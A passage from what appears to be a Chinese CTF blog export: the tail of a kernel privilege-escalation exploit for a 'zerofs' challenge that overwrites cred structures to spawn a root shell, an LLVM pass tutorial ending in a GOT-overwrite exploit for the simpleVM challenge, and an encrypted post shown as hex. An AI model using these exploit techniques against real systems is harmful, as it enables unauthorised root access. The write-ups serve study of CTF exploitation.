(writePadding(fd,ZEROFS_DEFAULT_BLOCK_SIZE-sizeof(struct zerofs_inode)*2)) &#123;        return -1;     &#125;     if (write_evil_dirent(fd)) &#123;        return -1;     &#125;     if (writePadding(fd,ZEROFS_DEFAULT_BLOCK_SIZE-sizeof(struct zerofs_dir_record))) &#123;        return -1;     &#125;     //写文件内容     char hello[0x100] = &quot;hello,I am hacker haivk!\\n&quot;;     write(fd,hello,sizeof(hello));     if (writePadding(fd,ZEROFS_DEFAULT_BLOCK_SIZE-sizeof(hello))) &#123;        return -1;     &#125;     close(fd);     return 0;  &#125;    //是否root成功  int rooted = 0;    void myExit(int pfd,int fd,int code) &#123;     sleep(2);     char buf[0x10] = &#123;0&#125;;     read(pfd,buf,0x10);     //接收到子进程root成功的信号     if (!strcmp(buf,&quot;success&quot;)) &#123;        rooted = 1;        wait(NULL);     &#125;     close(fd);     //卸载文件     system(&quot;./umount&quot;);     exit(code);  &#125;    int main() &#123;     if (access(&quot;/tmp/zerofs.img&quot;,F_OK)) &#123;        //创建一个带有溢出的文件系统        createEvilFs();     &#125;     //挂载这个文件系统     system(&quot;./mount&quot;);     //打开这个文件系统里的那个有问题的文件     int fd = open(&quot;/mnt/haivk&quot;,O_RDWR);     if (fd == -1) &#123;        printf(&quot;文件打开失败!!\\n&quot;);        exit(-1);     &#125;     //父进程与子进程通信     int pfd[2];     if (pipe(pfd) == -1) &#123;        puts(&quot;[*] pipe error!&quot;);        exit(0);     &#125;     //设置管道非阻塞模式     fcntl(pfd[0], F_SETFL, O_NONBLOCK);     fcntl(pfd[1], F_SETFL, O_NONBLOCK);       int pid = fork();     if (pid &lt; 0) &#123;        puts(&quot;[*] fork error!&quot;);        exit(0);     &#125; else if (pid == 0) &#123;        while (getuid() != 0) &#123;           sleep(1);        &#125;        //通过管道，通知父进程root成功        write(pfd[1],&quot;success&quot;,0x10);        //子进程root成功        printf(&quot;[+]rooted in subprocess!!\\n&quot;);        system(&quot;/bin/sh&quot;);     &#125; else &#123;        int uid = getuid();        size_t buf_len = 0x100000;        //创建一个缓冲区        unsigned int *buf = (unsigned int *)malloc(buf_len);        int ret;        //读取这个文件，直到读取到cred结构体为止        for (int i=0;i&lt;0x100 &amp;&amp; !rooted;i++) &#123;           ret = lseek(fd,i * buf_len, SEEK_SET);           if (ret &lt; 0) &#123;              printf(&quot;seek memory error!!\\n&quot;);              myExit(pfd[0],fd,-1);           &#125;           ret = read(fd,buf,buf_len);           if (ret &lt; 0) &#123;              printf(&quot;read memory error!!\\n&quot;);              myExit(pfd[0],fd,-1);           &#125;           int found = 0;           //搜索cred结构           for (int j=0;j&lt;ret/4 - 39 &amp;&amp; !rooted;j++) &#123;              if (buf[j] == uid &amp;&amp; buf[j+6] == uid &amp;&amp; buf[j+12] == uid &amp;&amp; buf[j+24] == uid)  &#123;                 printf(&quot;found cred struct!!\\n&quot;);                 buf[j] = 0;                 buf[j+6] = 0;                 buf[j+12] = 0;                 buf[j+24] = 0;                 buf[j+25] = 0;                 buf[j+39] = 0;                 found = 1;              &#125;           &#125;           if (found) &#123;              if (lseek(fd,i * buf_len, SEEK_SET) &lt; 0) &#123;                 printf(&quot;seek2 memory error!!\\n&quot;);                 myExit(pfd[0],fd,-1);              &#125;              write(fd,buf,ret);              if (getuid() == 0) &#123;                 //父进程本身root成功                 printf(&quot;[+]rooted in parent process!!\\n&quot;);                 system(&quot;/bin/sh&quot;);                 rooted = 1;              &#125;           &#125;          &#125;     &#125;     myExit(pid,fd,0);     return 0;  &#125;  \n\n\n\n一次提权失败的时候，可以多次尝试，大概一两次就能提权了。\n","categories":["CTF"],"tags":["堆溢出","Linux Kernel","文件系统"]},{"title":"LLVM PASS PWN","url":"/2021/05/28/llvm-pass-pwn/","content":"文章首发于安全KER https://www.anquanke.com/post/id/240748\n0x00 前言从红帽杯的simpleVM一题学习LLVM PASS，理解并运行我们的第一个LLVM PASS，然后逆向分析LLVM PASS的模块。\n0x01 LLVM PASSPass就是“遍历一遍IR，可以同时对它做一些操作”的意思。LLVM的核心库中会给你一些 Pass类 去继承。你需要实现它的一些方法。 最后使用LLVM的编译器会把它翻译得到的IR传入Pass里，给你遍历和修改。\nLLVM Pass有什么用呢？1.显然它的一个用处就是插桩，在Pass遍历LLVM IR的同时，自然就可以往里面插入新的代码。2.机器无关的代码优化：大家如果还记得编译原理的知识的话，应该知道IR在被翻译成机器码前会做一些机器无关的优化。 但是不同的优化方法之间需要解耦，所以自然要各自遍历一遍IR，实现成了一个个LLVM Pass。 最终，基于LLVM的编译器会在前端生成LLVM IR后调用一些LLVM Pass做机器无关优化， 然后再调用LLVM后端生成目标平台代码。3.等等\n0x02 LLVM IR传给LLVM PASS进行优化的数据是LLVM IR，即代码的中间表示，LLVM IR有三种表示形式\n1、.ll 格式：人类可以阅读的文本。2、.bc 格式：适合机器存储的二进制文件。3、内存表示\n从对应格式转化到另一格式的命令如下：\n.c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll.c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc.ll -&gt; .bc: llvm-as a.ll -o a.bc.bc -&gt; .ll: llvm-dis a.bc -o a.ll.bc -&gt; .s: llc a.bc -o a.s\n如下是我们的一个简易程序\n#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() &#123;   char name[0x10];   read(0,name,0x10);   write(1,name,0x10);   printf(&quot;bye\\n&quot;);&#125;\n通过命令\nclang -emit-llvm -S main.c -o main.ll\n可以生成IR文本文件\n; ModuleID = &#x27;main.c&#x27;source_filename = &quot;main.c&quot;target datalayout = &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;target triple = &quot;x86_64-pc-linux-gnu&quot;@.str = private unnamed_addr constant [5 x i8] c&quot;bye\\0A\\00&quot;, align 1; Function Attrs: noinline nounwind optnone uwtabledefine i32 @main() #0 &#123;  %1 = alloca [16 x i8], align 16  %2 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0  %3 = call i64 @read(i32 0, i8* %2, i64 16)  %4 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0  %5 = call i64 @write(i32 1, i8* %4, i64 16)  %6 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0))  ret i32 0&#125;declare i64 @read(i32, i8*, i64) #1declare i64 @write(i32, i8*, i64) #1declare i32 @printf(i8*, ...) #1attributes #0 = &#123; noinline nounwind optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;attributes #1 = &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;!llvm.module.flags = !&#123;!0&#125;!llvm.ident = !&#123;!1&#125;!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;!1 = !&#123;!&quot;clang version 6.0.0-1ubuntu2 (tags/RELEASE_600/final)&quot;&#125;\n从中可以看到IR中间代码表示的非常直观易懂，而LLVM PASS就是用于处理IR，将一些能够优化掉的语句进行优化。\n0x03 编写一个简单的LLVM PASS从官方文档里，我们可以找到一个简易的示例\n#include &quot;llvm/Pass.h&quot;#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;#include &quot;llvm/IR/LegacyPassManager.h&quot;#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;using namespace llvm;namespace &#123;  struct Hello : public FunctionPass &#123;    static char ID;    Hello() : FunctionPass(ID) &#123;&#125;    bool runOnFunction(Function &amp;F) override &#123;      errs() &lt;&lt; &quot;Hello: &quot;;      errs().write_escaped(F.getName()) &lt;&lt; &#x27;\\n&#x27;;      return false;    &#125;  &#125;;&#125;char Hello::ID = 0;// Register for optstatic RegisterPass&lt;Hello&gt; X(&quot;hello&quot;, &quot;Hello World Pass&quot;);// Register for clangstatic RegisterStandardPasses Y(PassManagerBuilder::EP_EarlyAsPossible,  [](const PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;    PM.add(new Hello());  &#125;);\n该示例用于遍历IR中的函数，因此结构体Hello继承了FunctionPass ，并重写了runOnFunction函数，那么每遍历到一个函数时，runOnFunction都会被调用，因此该程序会输出函数名。为了测试，我们需要将其编译为模块\nclang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`\n然后我们以前面那个简易程序的IR为例\nroot@ubuntu:~/Desktop# opt -load LLVMHello.so -hello main.llWARNING: You&#x27;re attempting to print out a bitcode file.This is inadvisable as it may cause display problems. Ifyou REALLY want to taste LLVM bitcode first-hand, youcan force output with the `-f&#x27; option.Hello: main\n其中参数中的-hello是我们在代码中注册的名字\n// Register for optstatic RegisterPass&lt;Hello&gt; X(&quot;hello&quot;, &quot;Hello World Pass&quot;);\n现在，我们在前面基础上加入对函数中的代码进行遍历的操作\n#include &quot;llvm/Pass.h&quot;#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;#include &quot;llvm/IR/LegacyPassManager.h&quot;#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;using namespace llvm;namespace &#123;  struct Hello : public FunctionPass &#123;    static char ID;    Hello() : FunctionPass(ID) &#123;&#125;    bool runOnFunction(Function &amp;F) override &#123;      errs() &lt;&lt; &quot;Hello: &quot;;      errs().write_escaped(F.getName()) &lt;&lt; &#x27;\\n&#x27;;      SymbolTableList&lt;BasicBlock&gt;::const_iterator bbEnd = F.end();      for(SymbolTableList&lt;BasicBlock&gt;::const_iterator bbIter=F.begin(); bbIter!=bbEnd; ++bbIter)&#123;         SymbolTableList&lt;Instruction&gt;::const_iterator instIter = bbIter-&gt;begin();         SymbolTableList&lt;Instruction&gt;::const_iterator instEnd  = bbIter-&gt;end();         for(; instIter != instEnd; ++instIter)&#123;            errs() &lt;&lt; &quot;opcode=&quot; &lt;&lt; instIter-&gt;getOpcodeName() &lt;&lt; &quot; NumOperands=&quot; &lt;&lt; instIter-&gt;getNumOperands() &lt;&lt; &quot;\\n&quot;;         &#125;      &#125;      return false;    &#125;  &#125;;&#125;char Hello::ID = 0;// Register for optstatic RegisterPass&lt;Hello&gt; X(&quot;hello&quot;, &quot;Hello World Pass&quot;);// Register for clangstatic RegisterStandardPasses Y(PassManagerBuilder::EP_EarlyAsPossible,  [](const PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;    PM.add(new Hello());&#125;);\n然后以同样的方式运行\nroot@ubuntu:~/Desktop# opt -load LLVMHello.so -hello main.llWARNING: You&#x27;re attempting to print out a bitcode file.This is inadvisable as it may cause display problems. Ifyou REALLY want to taste LLVM bitcode first-hand, youcan force output with the `-f&#x27; option.Hello: mainopcode=alloca NumOperands=1opcode=getelementptr NumOperands=3opcode=call NumOperands=4opcode=getelementptr NumOperands=3opcode=call NumOperands=4opcode=call NumOperands=2opcode=ret NumOperands=1\n可以看到成功遍历出了函数中的指令操作\n0x04 LLVM PASS模块逆向分析分析现在，我们将LLVMHello.so模块放入IDA进行静态分析在初始化函数，调用了函数进行对象的创建该函数如下我们需要关注一下虚表结构，这样才方便我们确定各函数的位置可以看到runOnFunction函数位于虚表中的最后一个位置，并且由于runOnFunction函数被我们重写，其指向的是我们自定义的那个函数,由此我们跟进可以看到这正是我们重写的runOnFunction函数，因此对于LLVM PASS，定位函数的位置因从虚表入手。\n调试由于模块是动态加载的，并且运行时也不会暂停下来等我们用调试器去Attach，因此我们可以直接使用IDA来进行调试，其参数设置如下在模块需要调试的地方设置断点，然后使用IDA来启动opt程序即可进行模块的调试\n0x05 红帽杯 simpleVM分析首先找到注册函数跟进以后，找到虚表位置找到runOnFunction函数的地址这里先是对当前遍历到的函数名进行匹配如果函数名是o0o0o0o0，则调用函数sub_7F5C11B24AC0进行进一步处理可以看到该函数遍历IR中o0o0o0o0函数中的BasicBlock(基本代码块)，然后继续调用sub_7F5C11B24B80函数进行处理该函数会遍历BasicBlock(基本代码块)中的指令，然后匹配到对应指令后进行处理，这里匹配到add函数时，会根据其操作数1的值，来选择对应的存储区（这里我们可以看做寄存器），将操作数2累加上去当匹配到load操作时，将对应的寄存器中的值看做是地址，从地址中取出8字节数据存入另一个寄存器中可以看到load的处理过程中，并没有边界检查，而且其寄存器中的值可以通过add来完全控制，由此这里出现一个任意地址读的漏洞，同理，我们看到store，同理存在任意地址写的漏洞。\n漏洞利用由于优化器opt-8未开启PIE和GOT完全保护，因此，可以借助add、load、store来完成对opt-8二进制程序的GOT表的改写，可以直接将opt-8二进制程序的GOT表中的free表项改为one_gadget，即可获得shellexp.c\nvoid store(int a);void load(int a);void add(int a, int b);void o0o0o0o0()&#123;    add(1, 0x77e100);    load(1);    add(2, 0x729ec);    store(1);&#125;\n使用clang -emit-llvm -S exp.c -o exp.ll得到IR文本文件，然后传给opt-8进行优化\nroot@ubuntu:~/Desktop# ./opt-8 -load ./VMPass.so -VMPass ./exp.llWARNING: You&#x27;re attempting to print out a bitcode file.This is inadvisable as it may cause display problems. Ifyou REALLY want to taste LLVM bitcode first-hand, youcan force output with the `-f&#x27; option.# whoamiroot# \n\n0x06 感想学习并入门了LLVM PASS，收获很多！\n0x07 参考[红帽杯 2021] PWN – WriteupWriting an LLVM Pass — LLVM 12 documentationLLVM Pass入门导引LLVM Pass 简介（2）\n","categories":["CTF","安全研究"],"tags":["LLVM PASS","编译器"]},{"title":"Apple UVDM协议与充电器通信安全研究","url":"/2025/07/01/macos-uvdm-adapter-research/","content":"\n  d053c3fe8942d4d43d46e77072b4e3a84e89ad1a2fd0a06b0804843ed761dac48f82297ec213e64229a35740b4ea357d73dd3ac64cb586718e629fe964c6158b6b668ad00cfccfbccaf53c290fb957e30034359bf7e4e621e13f868f5fd7e4cf0a636f0e705a25e4592ee0c8c90d67ae2fb05c8989aebea12e07921aafbf545f477dd0b4f1588cdffaea4fe831dadf10920f47ef1ab15009b2281ff6b41a255b5491b9adbb07b6cf134c2d906a12663b93d1469b8db5b626c1c2663b4a46c8c6a073ce4db15c8663835fa39a5c507f1b347eef98ccc76211c7efa127473c2fbf7b910c72ab72f2ceed5e12d2560d2d238216687cff2a95ae25549a460dcafd686ce380bfea0ab8eb81b36b10c7f5204f46628e9279c0fce16f090fb7e8cadc072ae60c975a7535a5f57c4a59ea41bfd904363d01eb997104c7fa1e28cf418499f26a058ca1b9b56f64f0297281f96dc9b4eb2966b6adf37f9a5d2dabcc1d6590c0f64d2d59527b2ac2733a52689d2279a5921edf374af777f0b939d368fd0d79c0d2da1a71554ce79b0338957c391404d909f1e35db5f3ac9b3122c14d95924d02a9bbdde284ecba99a3f1346e8439011c9b1c3b69451b94ddca0be22fee7baaced157bd55cf4aea7330a6379cdd5f27ebbcccccbac6bf49b7c620ba651429d1be729b1bf7ee230789d484023b90e5cf5e7fd452c8d53046acfbdd5446b5f66fab76f42c3b511c175f89bee398da4627a35f06b1a4bf09fbe38ab7493a7a5719390ff6affd3e22541d8d8f9a34acb0bea214ffa5b762c094858204f7138713ba90d5349a48065ba43c7577dcbb7330453e5a8c2453acdb450d5f449584c2afed9d42279ae69c06ff22d0b4771057a72f74d62690f9a74228b846fc2d92046584a041b5d72c16a68aca6bcc2b764359fe6b2336a8a0a97a958278d5388abe52975d23437e78f0e91fd199e534fbee64f5ecb6c945622f50e64704193fb592ad5c0d0a4b6a78807323ec073dcd3830736211b6e1ecf098f53c22d4569620e208111962dba484db572c6250b5a6a302cd112004e10847c98aa0bdd3530a58027ac10f31a9a8876e1c2233320e9878710a93a07356e4695283121bf4fc8b42426dbb52217e5f724757964c41c58568fbfe8220f386b34aa3b6540096c58f2e2caf5a4b3db5c2e74d1d60b48c0e5b9398cc5aa7e8ae7807c1cf082d3f8df5c6ca4fb717d162ab19378cb12043a7c4e7c91cbfd21f075ef6f03cfdbffd38a20189de285a3b5fc7496d2ae4d1ad3591e724b5489a7359937c4fd2c1a45eb8992d8983fefd538ce85fab7abb7f8aaa0c13c9f25857c8ebc0b63c2217522477bb1fcb4f0942f3167206b3ac44444256d549b45e104c2b0a8c33c1c082896c545371b1fa473e130c0c3e7639adc89e84b6699eefac636c76a31c670631dd47aa204c61df8d4639a9d50660ebaf916a5e8fe02b6c54cbcaf0724a71f95b5865e16ea2b12b716367bb39882a76b0e72f5c3e6e7df9bb346d328b59547837b89a0cdff86f43c16a9a2cf4200dc32fb1cb94e9a7a22074ab6e6b094d3aadd735b21a00f21e8715bcbf97080317938d9e1d169fae97dd2c8364aee706b3fe185fb3af839a894666d7e16f9fd965b6fd1f89b314e739a13634c916245ef5d631dff9ac558d1755184b5aec73f067eeec022b53fbe5fc2093707de8e67fe7dea878453249c8ea9e8ec72296c8fa81df62219b5c83f3ac8f8212407ac0c182de7524e8a22708cc6db2984d68ee826de204519bf123f5f75f211a20e60e4fd9166d518c49bc7f2aa1247b6cd9846b64b5774eb2f6ef97a62a3930176f8bf4cfe39e3081ad15fe1d4c618f6c0c0ef9a18b91db96ecf89eadc0888c2eebaf9317d7428f8e01c2f2af8b72c986f946a6f07868b7556419a429d4ea0e38d96bb23a63662811804b8601e4302741c1cfbdd9c92a7088660b1358b32ed27944817ad95c37069640b6a489770438851917d2707d6d99811ab9d3080e770cd9117a50638cf9552dcb79435616cb9e5e9051e5d27d07de3ccc31fb4f4d7d3cec2d4d0e848a170a8a160eb900359d9e259357cebfe81066c66b8375e52c0d22ecd4d717f6358d77e9d6a923aca6122d352fa71d925d30facd0b9b9bad1d654fe61599edd9952b93d1c3c187d8fd952898b3e0d55a46eebb3eac563ab406575c5897f00513a80a264db50a8e5c117bbe1560b5ef3963a355b2e3bcc70588b3cb24dc2b3fbff0fdec77fa6a422124af9d7cd9e73b298befd725fbacd1f499792b57ca4caa54cdaad4ce22b84b7894c16a0045203ba46cd6a7f13c1da996d4c16ec9b17b3b7443076882653691950ef903689b6d6b68c2bb209f004c292d76e8f6cf80c0644d7b5f598e54bdbfe89c074922e4c592100c8fd5241854d483ab811e75f79a68b7ce056de3ebadeac6152fccdb2cb878326a7bf308691c9ec9f12b7af34c1b3eccd9be158753d8669be31c17ecd1bc2a6bc5b43a2710168af89fa4f2fac1de58a2b8cf4f66dfeef89a86fc6fa4a078e8bb73064005a2cc6106d8762a7758614765f90982f469adf64b69ed860fb94477ed036a2f6c888fcbd9372943685249b4228acd321b83fa910881c2518160cae30dce926f502489b5f41e15586db79a22560e3d42171fe2cf766492fa57ae9a9d403917446ef685590e6c90311ebdc49bafbba34fc8d5fb6b520f8a65f38a79d0f89b76c529508913ca1e31db77f2c2fe568a6b74925f5aa54444698c4415d1db1afe70a8fed68a8851e3fc9cac60a30460490a131ae34905c176c35186dee2abe56258f6c496dcbd732676559c80e2f78a3032cb002be079fec23a2a3f826df5eeeb70843f4d8a1baf02ef834574887d512aa5123f63c9ec2d3394ee920fdbbb74aaa33b50cd42cf15a21505be70a8ce5a7410d5352aed02669939b04f42ae57ebcab6eb700e62b7c33af756d3038f37b8c57dfa8d01cd630aad769b4cdec168433ba729d7a5e022fcdd8a98a5d7fb92ff19f4193c72645c5cdd646b0ceaedf3455c9260a3e44e7cd4431ae378f7b87f5b05e9cf93074acd233488d0ba22eb14390678eaedefe59a187178804710c2aae054b214f1a980eb1a77537afc8e0d248c6a062f2203800d3db3afa73bb643824ab8a05c90373c10844e1ad227598ab9aa992c72ef374aa7f84836ef7da6c01d3327a4458d2ba374c4123393f53430de969075ca1542e9e7faec9c6d9053481d2402b4c86ca16473007a50c4cd192cfd72d090dc6a451107e1056608a9af2cc40a949e5f89a7c30896b0d3cfe1d8ff3837241434850100f21d9483641718620284189f4a887ecaa2ec0a1b681c3210fe2dd16152a1662dee12c095172421b3f663b8b5e5c2225b4ba3f24351110ff2a6294d464b1d3ded47a6a732d0411a8f8102c9d49010ef7af4ef191fd675640e77d85a2c0d3c1e19b3f5a51d1869f1f61cebb7a04a466785b4774c7199404cad26fdef672d6ee3897fe2578996333e8dc199ef06601341156db87151d0172bf5282d3aa744b3070894409586cf1dbaadd078101aabbb8e676674cea5d8a6d2443cda210f5c351aa77c76760e8202e788bb7e8f321d45a54befd24a0115fe94cc3e684ffd64294f18f89625bd793c5f11055d8f25de8267d56b06e827caf32ca5ae6669f3aeedcd07dfd8b169951fedf66b5864a9c851532864c2d346373ae6d6d31f6171130bf13059ad5778be169be0b089655f6d6f6e321e8a4110b445249143b1914e500f5deb0dd2a1f9e7bedc7d1bc26ed9f1b0de4491170b9dcf962cfed3106dc69e5c1c941435d5b1e25634c5e0bfbdeff6ef950c39ab4864c029f6d4100a2c0434cc31546697576aa3e9467cde55df6f5474b7ae8aa2e7a35befa6a702f23758346e8292ef5b65bd44cfcb1183aadb96a174e7c38c303e7cd314b6cd90ee544b4a2332fda1c26a582d4822176bb6dd17df75787678da3ab4ad463eb3316a2ca3783db9fd922f9f29e901ffbc8fe03e9f6b44117399c030aecf3d2f8541ede26d11e6bf506adb10eb15555dc7a74adc9673314412e81242ca20e713e9d354b31216d244fe6e1c175c21a63796c10bd6e793c80aef8835cc06579935e7ec6270f60f568b0530694ee8201d6247cdd662371123ba309b4e1b9b052bbc6ee343406d03a8c464f103800e504eddafee771c77dfcd51be05ad0f571315e6c3ff169231f30216d080677276d524328308c1e4bd5b1dd407f55bb39b2d3ec145fbd7365054318a3c11b352fb5668984224938c8934061783eba912ba21cab559d55782f03538a941a99159b47e2ef8ebcea655d2a817da1c6aaa1a332bfb7a394d85195d493310e663d28dc5ad89c182153009753dea6c7fb33c81184d745eb3ebdec12b84cd49b8c9fb27d3816701227396530c45d75813a785ef413526803b6822d491c87bf9853f387a50d2ce546957e7a57410904e6898778a43823bfac8f5587151953417d897969952db759a34ead64cb5bca347a0f688688e891e10d22fee8d46616a486443bbf9430c1a07f525fda4c10a10e719c19fc302358078497685d81cbe3ba930bb9a42047c88f333296a59ce2dd83ab81c4baf27c612f1d9f1eb0f03e18c0f84b63ec274b6198d2c5be718f4863aaa3e4873e04df97ae8408aa50b86de0d5ce266ca95536ae6fcc0c3060e004f8366525acc72838b1d3b6aa29901a7ea53052bf8200eb5bd01a55978018a49d92f2c9edee7e9f6929552e5868ba3ee87e1f995c1eb737d3d7c24c64b3299e8c19826af54cbff6a087d1b3ba5399c4429125f63ca474f817f3a6cf5a9fd4434a695657d6f7f06dace5ebdf22f8982cb5b6d308d95b412bc69a1ca91d1e42df598ebfa538f290f141157108db8300fd8c0e837b293322a08b52cb9c24d6ed044a125bc3a378cd539c5dbfc4a3f033bfcd47fb01372b8d27de57bd8971f339ec3474d178e631bfddabec14c1b6cd117723277f978b259ceff8770995ced02ac7ee738f359f15f99810b63ad838869966e5415a9baec47e1719d7982bc792e77c303329afed6dbb682897b2c663ae5a8fde92e2bc8101a2c2b523c2599d91ff3f0d0e9ad691cd8a8a9a0bc3b139a62781eca3c9aba9ed173ea88d441c5db69938d23cbf0b5b7e19d4f4045c7eeb29a1ae9ceb8faa123d3e055d636ebea2cbde049165f384bff4fcaf7c2178b9c0277b1c535955455e58ffe619bc38586ea72242fb028c7a38ad682ce71147593b378d6eeedb868d72624c3f9a81eff2a7e2134cf918bef1bc84d7faded54b5c5717edca9ea27406f7526cc7a0c2386fdac456653dd86488b556e3e2599419f98b64f80ea1c96e10fd4b6d8be8d7be8b1f4fed10b0a5c4b0da12b94955f9b800adafdaf2746b18cf51dfe6a48fe59df87b7870e852d559e0a1ef33a194569ff6650611b48e1d042fa5677ca234ef70c3829758d14ca9ce3c09a7810f1d6adc8ef21e0c47d9d37eab2de25ac3834416f2d27131b49fc2a90de8fe61f28dfb258e5e1adac88dc3685e39d9accf51f55cf4d4a692f5ce560df1bcccfba86d41fe0cde001a08d2f50a4610acac04ff6494c0b2af9bf1fb29a90d2f953063e5c6d381faf12a3995340339ffc4da5cf37143116edb6bd91a2d84552c66d52a5b6ad714893a6542be18b8de3bb0e0d552e00fcdcb91cd4472cc7a23e9534a94783bd1c9de5d9641b2cc4844eb109fa2e5565b698d0ea1a1d35010134d18db6f63f86fb1eeaf2d107ff7b1f129943b7c731ade90377cfb0bc6e26e192ff9dffc35e06151a2bdcc73a86cd3fd3c6d40b18193ca87a801168af77babd0ec6c56e612109a2e372c88bfe8fefa958a2548fc7155e316b1cbd5d9465b77df4a03627fbfadeef7c054ec59d351ec477ffda9861755087415f237a077e29223fa44de2cf49134c9b44b3bd82a63f96d962b5913ecae9f31fca108d42fe12492c2a90325cd3cb2f279951a8341fb67405717adb2b1821a27cadaff46d824eed9f085efcaa36c4062ad1771a2424b9bc76032d456a69d055ee0537abee39917edc4f2f4612a89d92ce375dbb364d69e120bf29a4d3b700d2b3f07e3ac7a9752c925bfcb5653952caa9aee4b6c2c11fcc1f7d6e5af1aab376ce98d8f1c81c3232b5529ca4da00cc669ff3a8adb79ed00d9f66dc097726eea5fe54e1fb4d46d6249e0b28945d74e2b6d21f153aa705c77d4295cf4c6fe590be992770f42f07f15a254419fc4109ef0ba579432d4c1442f49d9f402f64ec349401086d061f873528b0b542cacb3d5ebbf55e0d8a5c445d80d635b34ab95fe66acc4e95cf5a8d14d2eed53fedea010bf855333f27ae1f9d6ff6cb50fbc99baa619cae81198e1dca37f6eb9dacdda8669e0cafd54080c37717a729d03fe2c81376d029bfc94a1cd8aa060d6993d6a177b57d2893c2d00d2f8c15faa9724b97ce12529455e02a81b18ce05350626ba38f14fa08b50e622457e2e2c1f6ba88c0ecbd824e007b70d01031ce855a1dc0069cbd3a965a8fa9ca986c5cd8581c99edf79b7dc922616acc6be2b5598f4a487d6159dcc0bd3eb5de5d756577e37cb928c1348f92e6dcb5d233d99083ea60bfd1f23008bea74d5aaf0cd8b1002d3c40a18d7790d7585326db23b951c98dd0b06a83f083873a3bcf7bac6f77ade6d51d7f2d323c9b1697ba170f014538eb3d909230e57cf18c01f8cb365e6911dcf2e391f1f309be264b79b08625702fd163354d74a3dc439fa433e75cc2e777dbf57dd1d9ff1acf642771d513652e1caec3e73870eaca692087de6c3283421e5887918a57a3ec11c49afa64691535cc4cb54fab479f6efaaf8b394eccdb78cc2e490cbb7a975ee441240a2719bda8d1bb0528302a1ca6bb2501441435187c99fb034bd83508aa4708c265f11d80d7b935f749b2d9a708ea916e61644e607bc0fd57b0e86ff66f817e953812b3255a4b0d7ad458cfef58d149a1b75478045e517345191e946231ddacf35e7412ae4aeed9c4765b8adc8a65e86498cbe6dd1ec8de2d674ecb923e02bb02809e900615d140466021defc1db1af12cbe804ff66738ccfcd67a3de2043d9e6c6df7fb246b22b395201a55bf318ccbc9233a5c74a2f052898b9e5107b08b096a43f416241d83800eb4f456c0e557e7e9b0e500928e8f5df72129cb432487e684d9ff797405a48447a46d82d63c5b44b0eca50365ae4a2284a5c31c7b2d170e919f75df54e0139aff7e4cf00f0f4c96544f2ea6fffe91612497d111f1e08e3149bef8601ebb01f804f1adb3c7169c1f1aff67cd145144c945c21bc0784b48737038a929174735e263e44342e0db040b73b78cca5dc2366966de22fe9075aac59e6ffdd652e8bb37411c6065cb3a30280efe9ac1fc4b5bbdc7c70158c86b7121295abe2e3abefef963785ca8390c768ed2473dd3f72b5879eaecdd664793c95884adcdf13ebb3f21707d43ce3f249b734c11a994a2334fa042677a7c40ebaaa02bd6418e7728cc1d5b86fcbae2ffdc405536a1c474e56440ada0890cc277324da41704c6c3b7ef4fdc47aca1e1131d7ef6ea3a85fdeff3a587c27d31684861b28d6babf8f3e1b691ca70e97f0cbb79f14cc52733af0577195ec655da1356afd25162f35c742344c31eef92763bb44f8c5e1e29f6890f21b4878d3892e6d0eb7ebb899f5dcf7a8a4e919304e0de3ff0e0f68befcfa8cec64ac64d641bfadec70918e182de2ad2bf85407f9740dac7d01b968ddf2dfbd29bdf878bbf0d1ff8e115804be5cee9201d72369a1e6f144da156e8c377a8efcf9f4e5f8596712387cf5adf37e6ff06bd1f928749ee771b8145fbfb350e78877240c4bc59e44b137c3b622af6ba19164c2070bbfd3d396318aba1a3467ed857674f1f410e2e4a5921caf79e5a0b1268d8130d254f61ef9fd0238c0b3caf67307a1e4e62aa3d009ab4dd01f53bbcc3f2cf60435d1bed5cc53c021602fe3ee0d7a887f99466b7401994d33699dfd42bf20a85774e938dce621859659e50187288b388243fbe8728d03c4c